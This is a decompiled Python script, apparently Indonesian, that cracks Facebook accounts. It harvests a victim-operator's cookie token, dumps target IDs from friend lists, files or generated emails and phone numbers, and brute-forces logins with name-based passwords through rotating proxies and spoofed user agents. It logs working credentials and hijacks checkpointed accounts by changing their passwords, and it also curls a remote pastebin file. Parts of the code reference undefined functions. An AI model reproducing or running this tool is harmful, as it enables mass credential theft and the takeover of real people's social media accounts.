# Decompile by Mardis (Tools By Kapten-Kaizo)
# Time Succes decompile : 2022-10-14 22:19:37.425120

import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,platform,base64
from random import randint
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from urllib.parse import quote
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
from random import randint
import requests, re, os, time
import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as ADIabba
from concurrent.futures import ThreadPoolExecutor as Adiabba
from datetime import datetime
from bs4 import BeautifulSoup
from multiprocessing.pool import ThreadPool
import platform,base64
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from concurrent.futures import ThreadPoolExecutor
try:
     import os, storage, requests, mechanize, bs4, futures
except ImportError:
    os.system('termux-setup-storage')
    os.system('clear')
    os.system('pip install requests')
    os.system('pip install mechanize')
    os.system('pip install bs4')
    os.system('pip install future')
    os.system('clear')
try:
    import requests
except ImportError:
    print('\n [âœ“] installing requests !...\n')
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('\n [âœ“] installing futures !...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n [âœ“] installing bs4 !...\n')
    os.system('pip install bs4')
if not os.path.isfile('.agents.txt'):
    os.system('curl -L https://pastebin.com/raw/6V6qwCqj.txt > .6V6qwCqj.txt')
ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]

ugen = []
dump = []
akun = []
pro = []
redmi = []
bahasa = "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"


for dx in range(1000):
	rr = random.randint
	rc = random.choice
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	lang = ["en-us","pt-pt"]
	ugent1 = f"Mozilla/5.0 (Linux; U; Android {str(rr(6,12))};  en-us; GT-{str(rc(aZ))}{str(rr(111,999))}{str(rc(aZ))}{str(rr(11111,99999))}; ko-kr) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,100))}.0.{str(rr(4200,4900))}.{str(rr(40,150))} Mobile Safari/537.36"
	if ugent1 in ugen:pass
	else:ugen.append(ugent1)
	ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(6,12))};  en-us; GT-{str(rr(11111,99999))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,100))}.0.{str(rr(4200,4900))}.{str(rr(40,150))} Mobile Safari/537.36"
	if ugent3 in ugen:pass
	else:ugen.append(ugent3)
	ugent4 = f"Mozilla/5.0 (X11; U; U; Linux x86_64; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,100))}.0.{str(rr(4200,4900))}.{str(rr(40,150))} Safari/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AT"
	if ugent4 in ugen:pass
	else:ugen.append(ugent4)
    
 
 

def cil():
	rr = random.randint; rc = random.choice
	az = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
	return str(rc([f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; SM-{str(rc(aZ))}{str(rr(111,999))}{str(rc(aZ))} Build/SP1A.{str(rr(11111,99999))}.016; ko-kr) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,100))}.0.{str(rr(4200,4900))}.{str(rr(40,150))} Mobile Safari/537.36 Puffin/9.2.0.{str(rr(11111,99999))}AP"]))
	

P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
my_color = [P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
pwpluss=[]
pwnya=[]
princp=[]
pwlist=[]
token = []
ok = []
cp = []
id = []
id2 = []
method = []
tokenku = []
user = []
uid = []
cokiku = []
taplikasi = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://mbasic.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

def loading():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r {N}[{H}•{N}] {H}Loading...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")

try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.proxy.txt','w').write(prox)
except Exception as e:
    exit(e)
 
try:
    prix= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.proxy.txt','w').write(prix)
except Exception as e:
    exit(e)


def logo():
    print(f"""{N}\t                                
  _ __   _____      _____ 
 | '_ \ / _ \ \ /\ / / __| {H}code by : CHAUDRY AZAN
{O} | | | |  __/\ V  V /\__ \ {M}status : PRIMNU.
 |_| |_|\___| \_/\_/ |___/ {K}github : MR-AZAN
                 """)                                              
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print(f'\n[%s✓%s] %s CRACK SELESAI!')
        print(f' ACCOUNT OK : %s%s%s'%(N,H,N,H,str(len(ok)),N))
        print(f' ACCOUNT CP : %s%s%s'%(K,N,K,str(len(cp)),N))
        cek_cp = input(f"{N}ingin cekopsi akun cp? ({H}iya{N}/{M}tidak{N}) : ")
        if cek_cp =="":
            print(f"\n [{M}!{N}] pilih yang bener memez");hasil(ok,cp)
        elif cek_cp in["Y","y"]:
            jalan(f" {N}[{M}!{N}] matikan dan nyalakan ulang modepesawat");time.sleep(5)
            ww=input(f"\n {N}[{K}?{N}] ganti password di akun  {BM}TAP YES{N} ({H}iya{N}/{M}tidak{N}): ")
            if ww in ("Y","iya","ya"):
                ubahP.append("y")
                print(f" {N}[{H}•{N}] Password example : {H}admin123{N}")
                pwBar=input(f" {N}[{K}?{N}] Enter new password : {H}")
                #print("\n")
                if len(pwBar) <= 5:
                    print('\n %s[%s×%s] Password minimum 6 characters'%(N,M,N))
                else:
                    pwBaru.append(pwBar)
            for memek in cp:
                kontol = memek.replace('\n', '')
                titid  = kontol.split(' • ')
                print(f'{N} {H}LOGIN PROCESS')
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[CP] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace("[CP] ", ""), titid[1])
                except requests.exceptions.ConnectionError:
                    continue
                    print("")
            print("")
            jalan(' %s[%s✓%s] %sChecking process is complete%s'%(N,H,N,H,N))
            jalan(' %s[%s✓%s] Retrun SC type "%spython run.py%s"'%(N,H,N,H,N));exit()
        elif cek_cp in["T","t"]:
            jalan(f"\n {N}[{H}•{N}] {N}Ok, thank you. Retrun SC type '{H}python run.py{N}'");exit()
        else:
            print(f"\n {N}[{M}!{N}] Choose Y/t");hasil(ok,cp)
    else:
        jalan('\n\n %s[%s!%s] Sorry you didnt get results'%(N,M,N));exit()
  
def clear_layar():
	try:os.system('clear')
	except:pass
	

def back():
	try:open('.cookie.txt','r').read();get_data()
	except IOError:login()
	
def ridwan_itu_gans(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
        
def ua_rozh():
	rr = random.randint
	rc = random.choice
	#{str(rc(['[FBAN/EMA;FBBV/382118484;FBAV/311.0.0.7.114;FBDV/SM-A107F;FBLC/id_ID;FBNG/4G;FBMNT/METERED;FBDM]','Safari','UCBrowser','Opera']))}
	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	return (f"Mozilla/5.0 (Linux; U; Android {str(rr(2,12))}.{str(rr(2,9))}.{str(rr(2,10))}; en-gb; NEO-X5-116A Build/{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 [FBAN/EMA;FBBV/382118484;FBAV/311.0.0.7.114;FBDV/SM-A107F;FBLC/id_ID;FBNG/4G;FBMNT/METERED;FBDM]/{str(rr(20,50))}.608.27.0")

def asw():
    os.system('clear')
    logo()
    try:
        ___kontol___ = input('[?] input cookies : ')
        data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":___kontol___})
        find_token = re.search("(EAAG\w+)", data.text)
        ken=open(".token.txt", "w").write(find_token.group(1))
        cok=open(".cokie.txt", "w").write(___kontol___)
        print(f'\n{H}LOGIN BERHASIL{P}')
        exit()
    except Exception as e:
        os.system("rm -f .token.txt")
        os.system("rm -f .cokie.txt")
        print('invalid')
        exit()
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cokie.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			mandaku(sy2,sy3)
		except KeyError:
			asw()
		except requests.exceptions.ConnectionError:
				asw()
	except IOError:
			asw()

def mandaku(my_name,my_id):
    ipm = requests.get(url_ip).json()
    IP = ipm["origin"]
    try:
        token = open('.token.txt','r').read()
        kukis = open('.cokie.txt','r').read()
        tokenku.append(token)
    except IOError:
        print('[×] Cookies Kadaluarsa ')
        time.sleep(5)
        #asw()
    os.system('clear')
    logo()
    print(f"{P}=============={N}\n")
    print(f"{M}INFOMASI PENGUNA SCRIPT ATAU TUMBAL FACEBOOK")
    print(f"{P}==============")
    print(f"{H} USERNAME TUMBAL FACEBOOK {H}{my_name}{N}")
    print(f"{H} LINK/UID TUMBAL FACEBOOK {H}{my_id}{N}")
    
    
    print(f'  {P}1. Mulai Crack Dari {P}[{M} Pertemann Publik{P} ]')
    print(f'  {P}2. Mulai Crack File {P}[{M} Dari Sdcard{P}] ')
    print(f'  {P}3. Mulai Crack Dari Foloowers {P}[{M} Publik {P}]')
    print(f'  {M}0. Keluar Dan Hapus Kukis {P} [{M} exit {P}]')
    cetak(nel(f'ketik "email" untuk crack email'))
    anjay = input(f' {P}pilih : ')
    if anjay in ('1', '01'):
        dump_massal()
    elif anjay in ('2', '02'):
        File()
    elif anjay in ('3', '03'):
        gabut()
    elif anjay in ('email','gmail','Email'):
    	clon_email
    elif anjay in ('E', 'ee'):
        os.system('rm -rf .token.txt');os.system('rm -rf .cokie.txt')
        jalan('\n %s[%s✓%s] %sSuccessfully delete Token/Cookie...'%(N,H,N,H))
        jalan('\n %s[%s✓%s] Retrun SC type "%spython run.py%s"'%(N,H,N,H,N));exit()
    else:
    	print(' [!] Choose Correct One');
    	mandaku()
def clon_email():
	rc = random.choice
	rr = random.randint
	bas = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
	global ok , cp
	print(f'{H}>{P} dump dari email, max 1000 id')
	nama = input('target : ')
	if ',' in str(nama):
		exit(f'masukan 1 nama saja')
	doma = input('domain : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		exit(f'{M}>{P} masukan domain yang benar')
	jumlah = input(f'{H}>{P} total  : ')
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(bas))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(bas))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(bas))}{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(B))}{C}'
		if D in dump:pass
		else:dump.append(D+'|'+nama)
		print('\rsedang dump %s id'%(len(dump)),end='')
		sys.stdout.flush()
	setting()
def File():
        try:
            fileX = input (' ᄂ Enter file path : ') 
            for line in open(fileX, 'r').readlines():
                dump.append(line.strip())
            return setting()
        except IOError:
            exit("\n [!] file %s not found"%(fileX))

def dump_massal():
	cetak(nel(f'start with public id'))
	try:
		token = open('.token.txt','r').read()
		kukis = open('.cokie.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(f'{P}How many targets do you want to start with? : '))
		print(f'{P}you start the thief with {jum} id')
	except ValueError:
		print(' input not work ')
		exit()
	if jum<1 or jum>100:
		print('  Gagal Dump Idz ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(' start with id to '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':kukis}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:dump.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(' ᄂ Sinyal Ngelag ')
			exit()
	try:
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{M}')
		print('└── Sinyal Ngelag ')
		exit()
	except (KeyError,IOError):
		print(f'└── {M} Pertemanan Tidak Public {M}')
		time.sleep(3)
		exit()


def gabut():
    dirs = os.listdir("results")
    print('%s══════════════════════════════════════════\n %sFILE RESULT CRACK%s'%(N,BM,N))
    for file in dirs:
        print(" [%s+%s] %s"%(H,N,file))
    files = input("\n %s[%s?%s] Enter file : %s"%(N,K,N,H))
    try:
        buka_baju = open(f'results/{files}','r').readlines()
    except IOError:
        print('\n [!] Sorry, the file doesnt exist');time.sleep(2);mandaku()
    ww=input(f"{N}══════════════════════════════════════════\n [{M}!{N}] Play airplanemode first.\n══════════════════════════════════════════\n {N}[{K}?{N}] Change password when {BB}TAP YES{N} [{H}Y{N}/{M}t{N}]: {K}")
    if ww in ("Y","y","ya"):
        ubahP.append("y")
        print(f"\n {N}[{H}•{N}] Password example : {H}admin123{N}")
        pwBar=input(f" [{K}?{N}] Enter new password : {K}")
        if len(pwBar) <= 5:
             print('\n %s[%s×%s] Password minimum 6 characters'%(N,M,N))
        else:
            pwBaru.append(pwBar)
    print(f' %s[%s•%s] Total %s%s%s account'%(N,H,N,H,str(len(buka_baju)),N))
    print("%s══════════════════════════════════════════"%(N))
    for memek in buka_baju:
        kontol = memek.replace('\n', '')
        titid  = kontol.split(' • ')
        print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
        jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[CP] ", "")}{N}')
        try:
            log_hasil(titid[0].replace("[CP] ", ""), titid[1])
        except requests.exceptions.ConnectionError:
            continue
            print("")
    print("")
    jalan(' %s[%s✓%s] %sChecking process is complete%s'%(N,H,N,H,N))
    jalan(' %s[%s✓%s] Retrun SC type "%spython run.py%s"'%(N,H,N,H,N));exit()
    
def log_hasil(user, pasw):
    global aman,cp,salah
    session=requests.Session()
    uas_cekdetekdor = "Mozilla/5.0 (Linux; Android 12; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_EN;FBAV/239.0.0.10.109;]"
    session.headers.update({"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":bahasa,"referer":"https://mbasic.facebook.com/","user-agent":uas_cekdetekdor})
    soup=BeautifulSoup(session.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
    link=soup.find("form",{"method":"post"})
    for x in soup("input"):
        data.update({x.get("name"):x.get("value")})
    data.update({"email":user,"pass":pasw})
    urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
    response=BeautifulSoup(urlPost.text, "html.parser")
    if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
        sys.stdout.write('\r %s[%s!%s] Turn on airplanemode 2 seconds'%(N,M,N)),
    if "c_user" in session.cookies.get_dict():
        if "Akun Anda Dikunci" in urlPost.text:
            print(f"\r {N}[{M}×{N}] Account locked")
        else:
            coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
            open('results/OKE.txt', 'a').write(f"[✓] {user} • {pasw}\n")
            jalan(f"\r {N}[{H}✓{N}] {H}Account unlocked{N}");time.sleep(0.03)
    elif "checkpoint" in session.cookies.get_dict():
        title=re.findall("\<title>(.*?)<\/title>",str(response))
        link2=response.find("form",{"method":"post"})
        listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
        for x in response("input"):
            if x.get("name") in listInput:
                data2.update({x.get("name"):x.get("value")})
        an=session.post(url_mb+link2.get("action"),data=data2)
        response2=BeautifulSoup(an.text,"html.parser")
        number=0
        cek=[cek.text for cek in response2.find_all("option")]
        if(len(cek)==0):
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                if "y" in ubahP:
                    mmk = pwBaru
                    jalan(f"\r [{H}•{N}] Status : {BB}{P}TAP YES{N}");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
                else:
                    mmk = "aman001"
                    jalan(f"\r [{H}•{N}] Status : {BB}{P}TAP YES{N}");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
            elif "Masukan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
                print(' [%s!%s] Sorry, the account is installed A2F'%(M,N))
            else:
                open('results/ERROR.txt', 'a').write(f"[CP] {user} • {pasw}\n")
                print(f" {N}[{M}!{N}] Error")
        else:
            open(f'results/CP-DETEKTOR-{ha}-{op}-{ta}.txt', 'a').write(f"[CP] {user} • {pasw}\n")
            print(" %s[%s•%s] There are %s options "%(N,H,N,len(cek)))
        for opt in range(len(cek)):
            print(f" [\x1b[1;92m{str(opt+1)}\x1b[0m] "+cek[opt])
    else:
        print(f"\r {N}[{M}!{N}] Password is wrong or has been changed")
        open('results/INVALID-OK.txt', 'a').write(f"[CP] {user} • {pasw}\n")
        
def ubah_pw(session,response,link2,user,mmk):
    dat,dat2={},{}
    but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
    for x in response("input"):
        if x.get("name") in but:
            dat.update({x.get("name"):x.get("value")})
    ubahPw=session.post(url_mb+link2.get("action"),data=dat).text
    resUbah=BeautifulSoup(ubahPw,"html.parser")
    link3=resUbah.find("form",{"method":"post"})
    but2=["submit[Next]","nh","fb_dtsg","jazoest"]
    if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
        for b in resUbah("input"):
            if b.get("name") in but2:
                dat2.update({b.get("name"):b.get("value")})
        dat2.update({"password_new":"".join(mmk)})
        an=session.post(url_mb+link3.get("action"),data=dat2)
        coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
        print(f"\r {N}[{H}TAP-YES{N}] {H}{user} • {''.join(mmk)}{N}")
        open('results/TAB-YES.txt', 'a').write(f"[TAP-YES] {user} • {''.join(mmk)}\n")
        
def crack_nomor():
	print(f' [{H}<{N}] crack nomor gunakan sandi manual')
	depan = input(' awalan : ')
	if len(depan)==3:pass
	else:exit(f' [{M}>{N}] contoh awalan nomor 089')
	jumla = input(' jumlah : ')
	for x in range(int(jumla)):
		rr = random.randint
		A = depan
		B = rr(1111,9999)
		C = rr(1,9)
		D = f'{A}{N}{str(rr(1111,9999))}{str(B)}'
		if D in dump:pass
		else:
			print(D)
			dump.append(D+'|123456')
		print('\r sedang dump %s id'%(len(id)),end=" ")
		sys.stdout.flush()
		sleep(0.0000003)
	setting()
		
def crack_search():
	nama = []
	custom = [" muhammad"," firman"," pratama"," tyz"," galau"," semarang"," boyolali"," cilacap"," kebumen"," banyumas"," herex"," tuban"," sumedang"," aja"," new"," baru"," setia"," sayang"," cinta"," syank kamu"," cantik"," ganteng"," imut"," kalem"," sragen"," susah sembuh"," sudah sembuh"," sakit"," wae"," sulung"," nur"," dwi"," x gans"," x jebe"," x cogan"," x id"," ganong"," situbondo"," aremania"," sunda"," garut"," cirebon"," sukabumi"," medan"," thejack"," bobotoh"," bonek"," suroboyo"," surabaya"," persebaya"," persib"," persija"," cilacap"," jepara"," solo"," official"," manis"," imut"," kalem"," utama"," sukses"," real"," semok"," kesepian"," rentcar"," makmur"," jaya"," jr"," tasik"," malang"," jogja"," mama"," ibuknya"," bundanya"," tiktok"," kece"," keren"," baru"," jutek"," saja"," putri"," andi"," dewi"," tri"," dian"," sri"," putri"," eka"," sari"," aditya"," basuki"," budi"," joni"," toni"," bekti"," cahya"," harahap"," riski"," farhan"," aden"," joko"," firman"," sulis"," soleh"," gagal"," kacau"," sulis"," rahmat"," indah"," pribadi"," saputro"," saputra"," kediri"," kudus"," jember"," situbondo"," pemalang"," wonosobo"," trenggalek","  tuban"," gresik"," bangkalan"," jombang"," kediri"," lamongan"," lumajang"," madiun"," magetan"," mojokerto"," nganjuk"," pacitan"," ngawi"," pasuruan"," ponorogo"," pamengkasan"," sidoarjo"," tuban"," blitar"," kediri"," banjarnegara"," batang"," blora"," brebes"," grobokan"," karanganyar"," kendal"," klaten"," kudus"," pati"," pekalongan"," rembang"," sragen"," tegal"," temanggung"," wonogiri"," wonosobo"," sukoharjo"," salatiga"," bandung"," ciamis"," cianjur"," cirebon"," indramayu"," majalengka"," subang"," sumedang"," purwakarta"," banjar"," bekasi"," bogor"," comahi"," depok"," tasikmalaya "]
	custom2 = ["mamah ","ibuk ","bunda ","ayah ","om ","muhammad ","putra ","gagah ","namaku ","panggeran ","putri ","dewi ","joko ","sri ","dwi ","cinta ","sayang ","riski ","pesulap ","mamanya ","tante ","bu ","pakde ","juli ","emak "]
	print(f' [{H}<{P}] 1 nama setara dengan 10k akun')
	nam = input(f' nama : ').split(",")
	for ser in nam:		
		for belakang in custom:
			id = ser+belakang
			nama.append(id)
		for depan in custom2:
			id = depan+ser
			nama.append(id)
	with tred(max_workers=35) as thread:
		for id in nama:
			thread.submit(cari_nama,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID")
	setting()
		
def cari_nama(link):
	r = parser(ses.get(str(link)).text,'html.parser')
	for x in r.find_all('td'):
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
		for uid,nama in data:
			if 'profile.php?' in uid:
				uid = re.findall('id=(.*)',str(uid))[0]
			elif '<span' in nama:
				nama = re.findall('(.*?)\<',str(nama))[0]
			bo = uid+'|'+nama
			if bo in dump:pass
			else:dump.append(bo)
	try:
		link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
		if(link):
			print('\r sedang dump %s id'%(len(dump)),end=" ")
			sys.stdout.flush()
			cari_nama(link)
	except:pass


def convert(bz):
	rr = random.randint;rc = random.choice
	return (f"sb=%s;datr=%s;dpr=2.{str(rr(111111111111111,999999999999999))};c_user=%s;locale={str(rc(['en_GB','en_US','id_ID','zh_CN']))};xs=%s;wd={str(rr(200,400))}x{str(rr(600,2000))};fr=%s;m_pixel_ratio=2.{str(rr(10,100))}"%(bz['sb'],bz['datr'],bz['c_user'],bz['xs'],bz['fr']))



def setting():
	#print("")
	print(' ᄂ Ingin Menampilkan aplikasi di akun ok iya/tidak ? ')
	aplik = input('Choose : ')
	if aplik in ['iya','Iya','y']:
		taplikasi.append('y')
		urut()
	elif aplik in ['tidak','no']:
		taplikasi.append('t')
		urut()
	else:
		setting()
		
        
def urut():
	#info()
	#print(47*"•")
    print(f'\n\t1. {M}start with id old-debst')
    print(f'\t{P}1. {H}start with id new-slow')
    print(f'\t{P}3. {K}start with id random-very-slow ')
    hu = input('what id do you want to start with? : ')
    if hu in ['1','01']:
        for tua in sorted(dump):
            id2.append(tua)

    elif hu in ['2','02']:
        muda=[]
        for bacot in sorted(dump):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3','03']:
        for bacot in dump:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));setting()
        exit()
    print(f'\t {P}1. method {H}mobile.facebook.com')
    hc = input(f'{P}Choice : ')
    if hc in ['1','01']:
        method.append('mobile')
    else:
        method.append('mobile')
    ch = input(f'{P} ingin memakai pasword manual? {P}({H}iya-debest{P}/{K}tidak-slow{P})?: ')
    if ch in ['iya','Iya']:gabung()
    elif ch in ['Tidak','tidak']:otomatis()
    else:otomatis()
    
def gabung():
	global prog,des
	pop = ["123456"]
	Bob = input(f'└─ input sandi manual 6 kata\nsandi  : ').split(',')
	Cob = input(f'└─ input sandi belakang nama\nsandi  : ')
	if ',' in str(Cob):
		exit(f" [{M}>{P}] sandi belakang satu kata saja")
	print('%s════════════════════════════════════════\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(N,H,N,ha, op, ta))
	print(' %s[%s+%s] CP : results/CP-%s-%s-%s.txt'%(N,K,N,ha, op, ta))
	print(f' [{H}√{N}] Mohon Sabar,Di Karenakan Metode Sangat Lambat')
	print(f' [{H}×{N}] Play Airplane Mode Every {M}500 ID{N}\n')
	acill_gans('•' * 40);prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'));des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
		#with ThreadPoolExecutor(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = pop+Bob
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'12345')
						pwv.append(frs+'1234')
						pwv.append(frs+'123')
						pwv.append(frs+Cob)
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'12345')
						pwv.append(frs+'1234')
						pwv.append(frs+'123')
						pwv.append(frs+Cob)
				if 'mobile' in method:
					pool.submit(crack,idf,pwv,'touch.facebook.com')
